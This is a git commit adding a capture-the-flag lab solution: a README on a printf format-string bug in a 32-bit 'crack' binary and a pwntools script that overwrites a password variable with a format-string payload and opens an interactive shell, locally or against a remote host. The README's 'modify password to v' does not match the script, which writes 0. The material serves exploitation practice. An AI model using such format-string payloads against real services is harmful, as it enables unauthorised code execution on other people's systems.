1faffc3beaae6855c6672daa9963e5b1ae08e2de
tanxin <tanxin.ctf@gmail.com>
2019-01-27 20:03:51 +0800

    upload lab7

---
+++ lab7/README.md
@@ -0,0 +1,26 @@
+# Simplerop
+- Printf vulnerability
+
+## Vulnerability
+Protection
+>   Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+
+
+
+Printf vulnerability
+```
+	read(0,buf,99);
+	...
+	printf(buf);
+```
+
+## Solution
+1.Use printf to modify password to v
+2.we can use exp generator `pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')`
+3.Pass check and get shell
+
+Script [solve.py](./solve.py)
---
+++ lab7/solve.py
@@ -0,0 +1,32 @@
+#!/usr/bin/env python
+from pwn import *
+import sys
+context.log_level="debug"
+#context.log_level="info"
+code=ELF("./crack",checksec=False)
+context.terminal = ['gnome-terminal','-x','sh','-c']
+context.arch = code.arch
+if len(sys.argv)>2:
+    con=remote(sys.argv[1],int(sys.argv[2]))
+    libc=ELF("./libc.so")
+elif len(sys.argv)>1:
+    libc = ELF(sys.argv[1])
+    con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
+else:
+    con=code.process()
+    if(context.arch == "amd64"):
+        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    else:
+        libc=ELF("/lib/i386-linux-gnu/libc.so.6")
+
+
+def z(commond=""):
+    gdb.attach(con,commond)
+def exploit():
+    password =0x804a048
+    writes={password:0}
+    payload = fmtstr_payload(10,writes,write_size="short")
+    con.sendafter("? ",payload)
+    con.sendlineafter("password :","0")
+exploit()
+con.interactive()    
